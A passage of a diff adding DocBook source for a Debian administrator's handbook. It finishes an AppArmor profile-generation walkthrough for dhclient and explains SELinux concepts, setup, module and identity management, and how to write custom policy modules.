+						At the kernel level, the special powers of the root user have been split in “capabilities”. When a system call requires a specific capability, AppArmor will verify whether the profile allows the program to make use of this capability.
+					</para>
+
+				</callout>
+				 <callout arearefs="aa-genprof-read">
+					<para>
+						Here the program seeks read permissions for <filename>/etc/nsswitch.conf</filename>. <command>aa-genprof</command> detected that this permission was also granted by multiple “abstractions” and offers them as alternative choices. An abstraction provides a reusable set of access rules grouping together multiple resources that are commonly used together. In this specific case, the file is generally accessed through the nameservice related functions of the C library and we type “3” to first select the “#include &lt;abstractions/nameservice&gt;” choice and then “A” to allow it.
+					</para>
+
+				</callout>
+				 <callout arearefs="aa-genprof-write">
+					<para>
+						The program wants to create the <filename>/run/dhclient-eth0.pid</filename> file. If we allow the creation of this specific file only, the program will not work when the user will use it on another network interface. Thus we select “New” to replace the filename with the more generic “/run/dhclient*.pid” before recording the rule with “Allow”.
+					</para>
+
+				</callout>
+				 <callout arearefs="aa-genprof-other-profile">
+					<para>
+						Notice that this access request is not part of the dhclient profile but of the new profile that we created when we allowed <filename>/usr/lib/NetworkManager/nm-dhcp-helper</filename> to run with its own profile.
+					</para>
+					 <para>
+						After having gone through all the logged events, the program offers to save all the profiles that were created during the run. In this case, we have two profiles that we save at once with “Save” (but you can save them individually too) before leaving the program with “Finish”.
+					</para>
+
+				</callout>
+
+			</calloutlist>
+			 <para>
+				<command>aa-genprof</command> is in fact only a smart wrapper around <command>aa-logprof</command>: it creates an empty profile, loads it in complain mode and then run <command>aa-logprof</command> which is a tool to update a profile based on the profile violations that have been logged. So you can re-run that tool later to improve the profile that you just created.
+			</para>
+			 <para>
+				If you want the generated profile to be complete, you should use the program in all the ways that it is legitimately used. In the case of dhclient, it means running it via Network Manager, running it via ifupdown, running it manually, etc. In the end, you might get a <filename>/etc/apparmor.d/sbin.dhclient</filename> close to this:
+			</para>
+			 
+<programlisting>
+# Last Modified: Tue Sep  8 21:40:02 2015
+#include &lt;tunables/global&gt;
+
+/sbin/dhclient {
+  #include &lt;abstractions/base&gt;
+  #include &lt;abstractions/nameservice&gt;
+
+  capability net_bind_service,
+  capability net_raw,
+
+  /bin/dash r,
+  /etc/dhcp/* r,
+  /etc/dhcp/dhclient-enter-hooks.d/* r,
+  /etc/dhcp/dhclient-exit-hooks.d/* r,
+  /etc/resolv.conf.* w,
+  /etc/samba/dhcp.conf.* w,
+  /proc/*/net/dev r,
+  /proc/filesystems r,
+  /run/dhclient*.pid w,
+  /sbin/dhclient mr,
+  /sbin/dhclient-script rCx,
+  /usr/lib/NetworkManager/nm-dhcp-helper Px,
+  /var/lib/NetworkManager/* r,
+  /var/lib/NetworkManager/*.lease rw,
+  /var/lib/dhcp/*.leases rw,
+
+  profile /sbin/dhclient-script flags=(complain) {
+    #include &lt;abstractions/base&gt;
+    #include &lt;abstractions/bash&gt;
+
+    /bin/dash rix,
+    /etc/dhcp/dhclient-enter-hooks.d/* r,
+    /etc/dhcp/dhclient-exit-hooks.d/* r,
+    /sbin/dhclient-script r,
+
+  }
+}
+</programlisting>
+
+		</section>
+
+	</section>
+	 <section id="sect.selinux">
+		<title>Introduction to SELinux</title>
+		 <indexterm>
+			<primary>SELinux</primary>
+		</indexterm>
+		 <section id="sect.selinux-principles">
+			<title>Prinsipper</title>
+			 <para>
+				SELinux (<emphasis>Security Enhanced Linux</emphasis>) is a <emphasis>Mandatory Access Control</emphasis> system built on Linux's LSM (<emphasis>Linux Security Modules</emphasis>) interface. In practice, the kernel queries SELinux before each system call to know whether the process is authorized to do the given operation.
+			</para>
+			 <para>
+				SELinux uses a set of rules — collectively known as a <emphasis>policy</emphasis> — to authorize or forbid operations. Those rules are difficult to create. Fortunately, two standard policies (<emphasis>targeted</emphasis> and <emphasis>strict</emphasis>) are provided to avoid the bulk of the configuration work.
+			</para>
+			 <para>
+				With SELinux, the management of rights is completely different from traditional Unix systems. The rights of a process depend on its <emphasis>security context</emphasis>. The context is defined by the <emphasis>identity</emphasis> of the user who started the process, the <emphasis>role</emphasis> and the <emphasis>domain</emphasis> that the user carried at that time. The rights really depend on the domain, but the transitions between domains are controlled by the roles. Finally, the possible transitions between roles depend on the identity.
+			</para>
+			 <figure>
+				<title>Security contexts and Unix users</title>
+				 <mediaobject>
+					<imageobject>
+						<imagedata fileref="images/selinux-context.png" format="PNG" scalefit="1" width="65%" />
+					</imageobject>
+
+				</mediaobject>
+
+			</figure>
+			 <para>
+				In practice, during login, the user gets assigned a default security context (depending on the roles that they should be able to endorse). This defines the current domain, and thus the domain that all new child processes will carry. If you want to change the current role and its associated domain, you must call <command>newrole -r <replaceable>role_r</replaceable> -t <replaceable>domain_t</replaceable></command> (there's usually only a single domain allowed for a given role, the <literal>-t</literal> parameter can thus often be left out). This command authenticates you by asking you to type your password. This feature forbids programs to automatically switch roles. Such changes can only happen if they are explicitly allowed in the SELinux policy.
+			</para>
+			 <para>
+				Obviously the rights do not apply to all <emphasis>objects</emphasis> (files, directories, sockets, devices, etc.). They can vary from object to object. To achieve this, each object is associated to a <emphasis>type</emphasis> (this is known as labeling). Domains' rights are thus expressed with sets of (dis)allowed operations on those types (and, indirectly, on all objects which are labeled with the given type).
+			</para>
+			 <sidebar> <title><emphasis>EXTRA</emphasis> Domains and types are equivalent</title>
+			 <para>
+				Internally, a domain is just a type, but a type that only applies to processes. That's why domains are suffixed with <literal>_t</literal> just like objects' types.
+			</para>
+			 </sidebar> <para>
+				By default, a program inherits its domain from the user who started it, but the standard SELinux policies expect many important programs to run in dedicated domains. To achieve this, those executables are labeled with a dedicated type (for example <command>ssh</command> is labeled with <literal>ssh_exec_t</literal>, and when the program starts, it automatically switches to the <literal>ssh_t</literal> domain). This automatic domain transition mechanism makes it possible to grant only the rights required by each program. It is a fundamental principle of SELinux.
+			</para>
+			 <figure>
+				<title>Automatic transitions between domains</title>
+				 <mediaobject>
+					<imageobject>
+						<imagedata fileref="images/selinux-transitions.png" format="PNG" scalefit="1" width="35%" />
+					</imageobject>
+
+				</mediaobject>
+
+			</figure>
+			 <sidebar> <title><emphasis>IN PRACTICE</emphasis> Finding the security context</title>
+			 <indexterm>
+				<primary>security context</primary>
+			</indexterm>
+			 <indexterm>
+				<primary>context, security context</primary>
+			</indexterm>
+			 <indexterm>
+				<primary>MCS (<emphasis>Multi-Category Security</emphasis>)</primary>
+			</indexterm>
+			 <para>
+				To find the security context of a given process, you should use the <literal>Z</literal> option of <command>ps</command>.
+			</para>
+			 
+<screen><computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>
+<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput></screen>
+			 <para>
+				The first field contains the identity, the role, the domain and the MCS level, separated by colons. The MCS level (<emphasis>Multi-Category Security</emphasis>) is a parameter that intervenes in the setup of a confidentiality protection policy, which regulates the access to files based on their sensitivity. This feature will not be explained in this book.
+			</para>
+			 <para>
+				To find the current security context in a shell, you should call <command>id -Z</command>.
+			</para>
+			 
+<screen><computeroutput>$ </computeroutput><userinput>id -Z</userinput>
+<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput></screen>
+			 <para>
+				Finally, to find the type assigned to a file, you can use <command>ls -Z</command>.
+			</para>
+			 
+<screen><computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>
+<computeroutput>unconfined_u:object_r:user_home_t:s0 test
+     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput></screen>
+			 <para>
+				It is worth noting that the identity and role assigned to a file bear no special importance (they are never used), but for the sake of uniformity, all objects get assigned a complete security context.
+			</para>
+			 </sidebar>
+		</section>
+		 <section id="sect.selinux-setup">
+			<title>Setting Up SELinux</title>
+			 <para>
+				SELinux support is built into the standard kernels provided by Debian. The core Unix tools support SELinux without any modifications. It is thus relatively easy to enable SELinux.
+			</para>
+			 <para>
+				The <command>apt install selinux-basics selinux-policy-default</command> command will automatically install the packages required to configure an SELinux system.
+			</para>
+			 <sidebar> <title><emphasis>CAUTION</emphasis> Reference policy not in jessie</title>
+			 <para>
+				Unfortunately the maintainers of the <emphasis role="pkg">refpolicy</emphasis> source package did not handle release critical bugs on their package and the package got removed from jessie. This means that the <emphasis role="pkg">selinux-policy-*</emphasis> packages are currently not installable in jessie and need to be fetched from another place. Hopefully they will come back in one of the point releases or in jessie-backports. In the meantime, you can grab them from unstable.
+			</para>
+			 <para>
+				This sad situation at least proves that SELinux is not very popular in the set of users/developers who are running the development versions of Debian. Thus, if you opt to use SELinux, you should expect the default policy to not work perfectly and you will have to invest quite some time to make it suitable to your specific needs.
+			</para>
+			 </sidebar> <para>
+				The <emphasis role="pkg">selinux-policy-default</emphasis> package contains a set of standard rules. By default, this policy only restricts access for a few widely exposed services. The user sessions are not restricted and it is thus unlikely that SELinux would block legitimate user operations. However, this does enhance the security of system services running on the machine. To setup a policy equivalent to the old “strict” rules, you just have to disable the <literal>unconfined</literal> module (modules management is detailed further in this section).
+			</para>
+			 <para>
+				Once the policy has been installed, you should label all the available files (which means assigning them a type). This operation must be manually started with <command>fixfiles relabel</command>.
+			</para>
+			 <para>
+				The SELinux system is now ready. To enable it, you should add the <literal>selinux=1 security=selinux</literal> parameter to the Linux kernel. The <literal>audit=1</literal> parameter enables SELinux logging which records all the denied operations. Finally, the <literal>enforcing=1</literal> parameter brings the rules into application: without it SELinux works in its default <emphasis>permissive</emphasis> mode where denied actions are logged but still executed. You should thus modify the GRUB bootloader configuration file to append the desired parameters. One easy way to do this is to modify the <literal>GRUB_CMDLINE_LINUX</literal> variable in <filename>/etc/default/grub</filename> and to run <command>update-grub</command>. SELinux will be active after a reboot.
+			</para>
+			 <para>
+				It is worth noting that the <command>selinux-activate</command> script automates those operations and forces a labeling on next boot (which avoids new non-labeled files created while SELinux was not yet active and while the labeling was going on).
+			</para>
+
+		</section>
+		 <section id="sect.selinux-management">
+			<title>Managing an SELinux System</title>
+			 <indexterm>
+				<primary><command>semodule</command></primary>
+			</indexterm>
+			 <indexterm>
+				<primary><command>semanage</command></primary>
+			</indexterm>
+			 <para>
+				The SELinux policy is a modular set of rules, and its installation detects and enables automatically all the relevant modules based on the already installed services. The system is thus immediately operational. However, when a service is installed after the SELinux policy, you must be able to manually enable the corresponding module. That is the purpose of the <command>semodule</command> command. Furthermore, you must be able to define the roles that each user can endorse, and this can be done with the <command>semanage</command> command.
+			</para>
+			 <para>
+				Those two commands can thus be used to modify the current SELinux configuration, which is stored in <filename>/etc/selinux/default/</filename>. Unlike other configuration files that you can find in <filename>/etc/</filename>, all those files must not be changed by hand. You should use the programs designed for this purpose.
+			</para>
+			 <sidebar> <title><emphasis>GOING FURTHER</emphasis> More documentation</title>
+			 <para>
+				Since the NSA doesn't provide any official documentation, the community set up a wiki to compensate. It brings together a lot of information, but you must be aware that most SELinux contributors are Fedora users (where SELinux is enabled by default). The documentation thus tends to deal specifically with that distribution. <ulink type="block" url="http://www.selinuxproject.org" />
+			</para>
+			 <para>
+				You should also have a look at the dedicated Debian wiki page as well as Russell Coker's blog, who is one of the most active Debian developers working on SELinux support. <ulink type="block" url="http://wiki.debian.org/SELinux" /> <ulink type="block" url="http://etbe.coker.com.au/tag/selinux/" />
+			</para>
+			 </sidebar> <section>
+				<title>Managing SELinux Modules</title>
+				 <para>
+					Available SELinux modules are stored in the <filename>/usr/share/selinux/default/</filename> directory. To enable one of these modules in the current configuration, you should use <command>semodule -i <replaceable>module.pp.bz2</replaceable></command>. The <emphasis>pp.bz2</emphasis> extension stands for <emphasis>policy package</emphasis> (compressed with bzip2).
+				</para>
+				 <para>
+					Removing a module from the current configuration is done with <command>semodule -r <replaceable>module</replaceable></command>. Finally, the <command>semodule -l</command> command lists the modules which are currently installed. It also outputs their version numbers. Modules can be selectively enabled with <command>semodule -e</command> and disabled with <command>semodule -d</command>.
+				</para>
+				 
+<screen><computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/abrt.pp.bz2</userinput>
+<computeroutput># </computeroutput><userinput>semodule -l</userinput>
+<computeroutput>abrt    1.5.0   Disabled
+accountsd       1.1.0   
+acct    1.6.0   
+[...]</computeroutput>
+<computeroutput># </computeroutput><userinput>semodule -e abrt</userinput>
+<computeroutput># </computeroutput><userinput>semodule -d accountsd</userinput>
+<computeroutput># </computeroutput><userinput>semodule -l</userinput>
+<computeroutput>abrt    1.5.0
+accountsd       1.1.0   Disabled
+acct    1.6.0   
+[...]</computeroutput>
+<computeroutput># </computeroutput><userinput>semodule -r abrt</userinput>
+<computeroutput># </computeroutput><userinput>semodule -l</userinput>
+<computeroutput>accountsd       1.1.0   Disabled
+acct    1.6.0   
+[...]</computeroutput></screen>
+				 <para>
+					<command>semodule</command> immediately loads the new configuration unless you use its <literal>-n</literal> option. It is worth noting that the program acts by default on the current configuration (which is indicated by the <literal>SELINUXTYPE</literal> variable in <filename>/etc/selinux/config</filename>), but that you can modify another one by specifying it with the <literal>-s</literal> option.
+				</para>
+
+			</section>
+			 <section>
+				<title>Managing Identities</title>
+				 <para>
+					Every time that a user logs in, they get assigned an SELinux identity. This identity defines the roles that they will be able to endorse. Those two mappings (from the user to the identity and from this identity to roles) are configurable with the <command>semanage</command> command.
+				</para>
+				 <para>
+					You should definitely read the <citerefentry><refentrytitle>semanage</refentrytitle>
+					<manvolnum>8</manvolnum></citerefentry> manual page, even if the command's syntax tends to be similar for all the concepts which are managed. You will find common options to all sub-commands: <literal>-a</literal> to add, <literal>-d</literal> to delete, <literal>-m</literal> to modify, <literal>-l</literal> to list, and <literal>-t</literal> to indicate a type (or domain).
+				</para>
+				 <para>
+					<command>semanage login -l</command> lists the current mapping between user identifiers and SELinux identities. Users that have no explicit entry get the identity indicated in the <literal>__default__</literal> entry. The <command>semanage login -a -s user_u <replaceable>user</replaceable></command> command will associate the <emphasis>user_u</emphasis> identity to the given user. Finally, <command>semanage login -d <replaceable>user</replaceable></command> drops the mapping entry assigned to this user.
+				</para>
+				 
+<screen><computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>
+<computeroutput># </computeroutput><userinput>semanage login -l</userinput>
+<computeroutput>
+Login Name           SELinux User         MLS/MCS Range        Service
+
+__default__          unconfined_u         SystemLow-SystemHigh *
+rhertzog             user_u               SystemLow            *
+root                 unconfined_u         SystemLow-SystemHigh *
+system_u             system_u             SystemLow-SystemHigh *
+# </computeroutput><userinput>semanage login -d rhertzog</userinput></screen>
+				 <para>
+					<command>semanage user -l</command> lists the mapping between SELinux user identities and allowed roles. Adding a new identity requires to define both the corresponding roles and a labeling prefix which is used to assign a type to personal files (<filename>/home/<replaceable>user</replaceable>/*</filename>). The prefix must be picked among <literal>user</literal>, <literal>staff</literal>, and <literal>sysadm</literal>. The “<literal>staff</literal>” prefix results in files of type “<literal>staff_home_dir_t</literal>”. Creating a new SELinux user identity is done with <command>semanage user -a -R <replaceable>roles</replaceable> -P <replaceable>prefix</replaceable> <replaceable>identity</replaceable></command>. Finally, you can remove an SELinux user identity with <command>semanage user -d <replaceable>identity</replaceable></command>.
+				</para>
+				 
+<screen><computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>
+<computeroutput># </computeroutput><userinput>semanage user -l</userinput>
+<computeroutput>
+                Labeling   MLS/       MLS/                          
+SELinux User    Prefix     MCS Level  MCS Range             SELinux Roles
+
+root            sysadm     SystemLow  SystemLow-SystemHigh  staff_r sysadm_r system_r
+staff_u         staff      SystemLow  SystemLow-SystemHigh  staff_r sysadm_r
+sysadm_u        sysadm     SystemLow  SystemLow-SystemHigh  sysadm_r
+system_u        user       SystemLow  SystemLow-SystemHigh  system_r
+test_u          staff      SystemLow  SystemLow             staff_r user_r
+unconfined_u    unconfined SystemLow  SystemLow-SystemHigh  system_r unconfined_r
+user_u          user       SystemLow  SystemLow             user_r
+# </computeroutput><userinput>semanage user -d test_u</userinput></screen>
+
+			</section>
+			 <section>
+				<title>Managing File Contexts, Ports and Booleans</title>
+				 <para>
+					Each SELinux module provides a set of file labeling rules, but it is also possible to add custom labeling rules to cater to a specific case. For example, if you want the web server to be able to read files within the <filename>/srv/www/</filename> file hierarchy, you could execute <command>semanage fcontext -a -t httpd_sys_content_t "/srv/www(/.*)?"</command> followed by <command>restorecon -R /srv/www/</command>. The former command registers the new labeling rules and the latter resets the file types according to the current labeling rules.
+				</para>
+				 <para>
+					Similarly, TCP/UDP ports are labeled in a way that ensures that only the corresponding daemons can listen to them. For instance, if you want the web server to be able to listen on port 8080, you should run <command>semanage port -m -t http_port_t -p tcp 8080</command>.
+				</para>
+				 <para>
+					Some SELinux modules export boolean options that you can tweak to alter the behavior of the default rules. The <command>getsebool</command> utility can be used to inspect those options (<command>getsebool <replaceable>boolean</replaceable></command> displays one option, and <command>getsebool -a</command> them all). The <command>setsebool <replaceable>boolean</replaceable> <replaceable>value</replaceable></command> command changes the current value of a boolean option. The <literal>-P</literal> option makes the change permanent, it means that the new value becomes the default and will be kept across reboots. The example below grants web servers an access to home directories (this is useful when users have personal websites in <filename>~/public_html/</filename>).
+				</para>
+				 
+<screen><computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>
+<computeroutput>httpd_enable_homedirs --&gt; off
+# </computeroutput><userinput>setsebool -P httpd_enable_homedirs on</userinput>
+<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> 
+<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput></screen>
+
+			</section>
+
+		</section>
+		 <section id="sect.selinux-custom-rules">
+			<title>Adapting the Rules</title>
+			 <para>
+				Since the SELinux policy is modular, it might be interesting to develop new modules for (possibly custom) applications that lack them. These new modules will then complete the <emphasis>reference policy</emphasis>.
+			</para>
+			 <para>
+				To create new modules, the <emphasis role="pkg">selinux-policy-dev</emphasis> package is required, as well as <emphasis role="pkg">selinux-policy-doc</emphasis>. The latter contains the documentation of the standard rules (<filename>/usr/share/doc/selinux-policy-doc/html/</filename>) and sample files that can be used as templates to create new modules. Install those files and study them more closely:
+			</para>
+			 
+<screen><computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/Makefile.example Makefile</userinput>
+<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.fc ./</userinput>
+<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.if ./</userinput>
+<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput></screen>
+			 <para>
+				The <filename>.te</filename> file is the most important one. It defines the rules. The <filename>.fc</filename> file defines the “file contexts”, that is the types assigned to files related to this module. The data within the <filename>.fc</filename> file are used during the file labeling step. Finally, the <filename>.if</filename> file defines the interface of the module: it is a set of “public functions” that other modules can use to properly interact with the module that you're creating.
+			</para>
+			 <section>
+				<title>Writing a <filename>.fc</filename> file</title>
+				 <para>
+					Reading the below example should be sufficient to understand the structure of such a file. You can use regular expressions to assign the same security context to multiple files, or even an entire directory tree.
+				</para>
+				 <example>
+					<title><filename>example.fc</filename> file</title>
+					 
+<programlisting role="scale"># myapp executable will have:
+# label: system_u:object_r:myapp_exec_t
+# MLS sensitivity: s0
+# MCS categories: &lt;none&gt;
+
+/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)
+</programlisting>
+
+				</example>
+
+			</section>
+			 <section>
+				<title>Writing a <filename>.if</filename> File</title>
+				 <para>
+					In the sample below, the first interface (“<literal>myapp_domtrans</literal>”) controls who can execute the application. The second one (“<literal>myapp_read_log</literal>”) grants read rights on the application's log files.
+				</para>
+				 <para>
+					Each interface must generate a valid set of rules which can be embedded in a <filename>.te</filename> file. You should thus declare all the types that you use (with the <literal>gen_require</literal> macro), and use standard directives to grant rights. Note, however, that you can use interfaces provided by other modules. The next section will give more explanations about how to express those rights.
+				</para>
+				 <example>
+					<title><filename>example.if</filename> File</title>
+					 
+<programlisting>## &lt;summary&gt;Myapp example policy&lt;/summary&gt;
+## &lt;desc&gt;
+##      &lt;p&gt;
+##              More descriptive text about myapp.  The &lt;desc&gt;
+##              tag can also use &lt;p&gt;, &lt;ul&gt;, and &lt;ol&gt;
+##              html tags for formatting.
+##      &lt;/p&gt;
+##      &lt;p&gt;
+##              This policy supports the following myapp features:
+##              &lt;ul&gt;
+##              &lt;li&gt;Feature A&lt;/li&gt;
+##              &lt;li&gt;Feature B&lt;/li&gt;
+##              &lt;li&gt;Feature C&lt;/li&gt;
+##              &lt;/ul&gt;
+##      &lt;/p&gt;
+## &lt;/desc&gt;
+#
+
+########################################
+## &lt;summary&gt;
+##      Execute a domain transition to run myapp.
+## &lt;/summary&gt;
+## &lt;param name="domain"&gt;
+##      Domain allowed to transition.
+## &lt;/param&gt;
+#
+interface(`myapp_domtrans',`
+        gen_require(`
+                type myapp_t, myapp_exec_t;
+        ')
+
+        domtrans_pattern($1,myapp_exec_t,myapp_t)
+')
+
+########################################
+## &lt;summary&gt;
+##      Read myapp log files.
+## &lt;/summary&gt;
+## &lt;param name="domain"&gt;
+##      Domain allowed to read the log files.
+## &lt;/param&gt;
+#
+interface(`myapp_read_log',`
+        gen_require(`
+                type myapp_log_t;
+        ')
+
+        logging_search_logs($1)
+        allow $1 myapp_log_t:file r_file_perms;
+')
+</programlisting>
+
+				</example>
+				 <sidebar> <title><emphasis>DOCUMENTATION</emphasis> Explanations about the <emphasis>reference policy</emphasis></title>
+				 <para>
+					The <emphasis>reference policy</emphasis> evolves like any free software project: based on volunteer contributions. The project is hosted by Tresys, one of the most active companies in the SELinux field. Their wiki contains explanations on how the rules are structured and how you can create new ones. <ulink type="block" url="https://github.com/TresysTechnology/refpolicy/wiki/GettingStarted" />
+				</para>
+				 </sidebar>
+			</section>
+			 <section id="sect.writing-a-te-file">
+				<title>Writing a <filename>.te</filename> File</title>
+				 <para>
+					Have a look at the <filename>example.te</filename> file:
+				</para>
+				 <sidebar> <title><emphasis>GOING FURTHER</emphasis> The <command>m4</command> macro language</title>
+				 <para>
+					To properly structure the policy, the SELinux developers used a macro-command processor. Instead of duplicating many similar <emphasis>allow</emphasis> directives, they created “macro functions” to use a higher-level logic, which also results in a much more readable policy.
+				</para>
+				 <para>
+					In practice, <command>m4</command> is used to compile those rules. It does the opposite operation: it expands all those high-level directives into a huge database of <emphasis>allow</emphasis> directives.
+				</para>
+				 <para>
+					The SELinux “interfaces” are only macro functions which will be substituted by a set of rules at compilation time. Likewise, some rights are in fact sets of rights which are replaced by their values at compilation time.
+				</para>
+				 </sidebar> 
+<programlisting>policy_module(myapp,1.0.0) <co id="example.te.module"></co>
+
+########################################
+#
+# Declarations
+#
+
+type myapp_t; <co id="example.te.type"></co>
+type myapp_exec_t;
+domain_type(myapp_t)
+domain_entry_file(myapp_t, myapp_exec_t) <co id="example.te.domain"></co>
+
+type myapp_log_t;
+logging_log_file(myapp_log_t) <co id="example.te.interface"></co>
+
+type myapp_tmp_t;
+files_tmp_file(myapp_tmp_t)
+
+########################################
+#
+# Myapp local policy
+#
+
+allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co id="example.te.allow"></co>
+
+allow myapp_t myapp_tmp_t:file manage_file_perms;
+files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
+</programlisting>
+				 <calloutlist>
+					<callout arearefs="example.te.module">
+						<para>
+							The module must be identified by its name and version number. This directive is required.
+						</para>
+
+					</callout>
+					 <callout arearefs="example.te.type">
+						<para>
+							If the module introduces new types, it must declare them with directives like this one. Do not hesitate to create as many types as required rather than granting too many useless rights.
+						</para>
+
+					</callout>
+					 <callout arearefs="example.te.domain">
+						<para>
+							Those interfaces define the <literal>myapp_t</literal> type as a process domain that should be used by any executable labeled with <literal>myapp_exec_t</literal>. Implicitly, this adds an <literal>exec_type</literal> attribute on those objects, which in turn allows other modules to grant rights to execute those programs: for instance, the <literal>userdomain</literal> module allows processes with domains <literal>user_t</literal>, <literal>staff_t</literal>, and <literal>sysadm_t</literal> to execute them. The domains of other confined applications will not have the rights to execute them, unless the rules grant them similar rights (this is the case, for example, of <command>dpkg</command> with its <literal>dpkg_t</literal> domain).
+						</para>
+
+					</callout>
+					 <callout arearefs="example.te.interface">
+						<para>
+							<literal>logging_log_file</literal> is an interface provided by the reference policy. It indicates that files labeled with the given type are log files which ought to benefit from the associated rules (for example granting rights to <command>logrotate</command> so that it can manipulate them).
+						</para>
+
+					</callout>
+					 <callout arearefs="example.te.allow">
+						<para>
+							The <literal>allow</literal> directive is the base directive used to authorize an operation. The first parameter is the process domain which is allowed to execute the operation. The second one defines the object that a process of the former domain can manipulate. This parameter is of the form “<replaceable>type</replaceable>:<replaceable>class</replaceable>“ where <replaceable>type</replaceable> is its SELinux type and <replaceable>class</replaceable> describes the nature of the object (file, directory, socket, fifo, etc.). Finally, the last parameter describes the permissions (the allowed operations).
+						</para>
+						 <para>
+							Permissions are defined as the set of allowed operations and follow this template: <literal>{ <replaceable>operation1</replaceable> <replaceable>operation2</replaceable> }</literal>. However, you can also use macros representing the most useful permissions. The <filename>/usr/share/selinux/devel/include/support/obj_perm_sets.spt</filename> lists them.
+						</para>
+						 <para>
+							The following web page provides a relatively exhaustive list of object classes, and permissions that can be granted. <ulink type="block" url="http://www.selinuxproject.org/page/ObjectClassesPerms" />
+						</para>
+
+					</callout>
+
+				</calloutlist>
+				 <para>
+					Now you just have to find the minimal set of rules required to ensure that the target application or service works properly. To achieve this, you should have a good knowledge of how the application works and of what kind of data it manages and/or generates.
+				</para>
+				 <para>
+					However, an empirical approach is possible. Once the relevant objects are correctly labeled, you can use the application in permissive mode: the operations that would be forbidden are logged but still succeed. By analyzing the logs, you can now identify the operations to allow. Here is an example of such a log entry:
+				</para>
+				 
+<programlisting>avc:  denied  { read write } for  pid=1876 comm="syslogd" name="xconsole" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file permissive=1
+</programlisting>
+				 <para>
+					To better understand this message, let us study it piece by piece.
+				</para>
+				 <table colsep="1">
+					<title>Analysis of an SELinux trace</title>
+					 <tgroup cols="2">
+						<thead>
+							<row>
+								<entry>Message</entry>
+								 <entry>Description</entry>
+
+							</row>
+
+						</thead>
+						 <tbody>
+							<row>
+								<entry> <computeroutput>avc: denied</computeroutput> </entry>
+								 <entry>An operation has been denied.</entry>
+
+							</row>
+							 <row>
+								<entry> <computeroutput>{ read write }</computeroutput> </entry>
+								 <entry>This operation required the <literal>read</literal> and <literal>write</literal> permissions.</entry>
+
+							</row>
+							 <row>
+								<entry> <computeroutput>pid=1876</computeroutput> </entry>
+								 <entry>The process with PID 1876 executed the operation (or tried to execute it).</entry>
+
+							</row>
+							 <row>
+								<entry> <computeroutput>comm="syslogd"</computeroutput> </entry>
+								 <entry>The process was an instance of the <literal>syslogd</literal> program.</entry>
+
+							</row>
+							 <row>
+								<entry> <computeroutput>name="xconsole"</computeroutput> </entry>
+								 <entry>The target object was named <literal>xconsole</literal>. Sometimes you can also have a “path” variable — with the full path — instead.</entry>
+
+							</row>
+							 <row>
+								<entry> <computeroutput>dev=tmpfs</computeroutput> </entry>
+								 <entry>The device hosting the target object is a <literal>tmpfs</literal> (an in-memory filesystem). For a real disk, you could see the partition hosting the object (for example: “sda3”).</entry>
+
+							</row>
+							 <row>
+								<entry> <computeroutput>ino=5510</computeroutput> </entry>
+								 <entry>The object is identified by the inode number 5510.</entry>
+
+							</row>
+							 <row>
+								<entry> <computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput> </entry>
+								 <entry>This is the security context of the process who executed the operation.</entry>
+
+							</row>
+							 <row>
+								<entry> <computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput> </entry>
+								 <entry>This is the security context of the target object.</entry>
+
+							</row>
+							 <row>
+								<entry> <computeroutput>tclass=fifo_file</computeroutput> </entry>
+								 <entry>The target object is a FIFO file.</entry>
+
+							</row>
+
+						</tbody>
+
+					</tgroup>
+
+				</table>
+				 <para>
+					By observing this log entry, it is possible to build a rule that would allow this operation. For example: <literal>allow syslogd_t device_t:fifo_file { read write }</literal>. This process can be automated, and it's exactly what the <command>audit2allow</command> command (of the <emphasis role="pkg">policycoreutils</emphasis> package) offers. This approach is only useful if the various objects are already correctly labeled according to what must be confined. In any case, you will have to carefully review the generated rules and validate them according to your knowledge of the application. Effectively, this approach tends to grant more rights than are really required. The proper solution is often to create new types and to grant rights on those types only. It also happens that a denied operation isn't fatal to the application, in which case it might be better to just add a “<literal>dontaudit</literal>” rule to avoid the log entry despite the effective denial.
+				</para>
+				 <sidebar> <title><emphasis>COMPLEMENTS</emphasis> No roles in policy rules</title>
+				 <indexterm>
+					<primary>Type Enforcement</primary>
+				</indexterm>
+				 <indexterm>
+					<primary>Enforcement, Type Enforcement</primary>
+				</indexterm>
+				 <para>
+					It might seem weird that roles do not appear at all when creating new rules. SELinux uses only the domains to find out which operations are allowed. The role intervenes only indirectly by allowing the user to switch to another domain. SELinux is based on a theory known as <emphasis>Type Enforcement</emphasis> and the type is the only element that matters when granting rights.
+				</para>
+				 </sidebar>
+			</section>
+			 <section>
+				<title>Compiling the Files</title>
+				 <para>
+					Once the 3 files (<filename>example.if</filename>, <filename>example.fc</filename>, and <filename>example.te</filename>) match your expectations for the new rules, just run <command>make NAME=devel</command> to generate a module in the <filename>example.pp</filename> file (you can immediately load it with <command>semodule -i example.pp</command>). If several modules are defined, <command>make</command> will create all the corresponding <filename>.pp</filename> files.
+				</para>
+
+			</section>
+
+		</section>
+
+	</section>
+	 <section id="sect.other-security-considerations">
+		<title>Other Security-Related Considerations</title>
+		 <para>
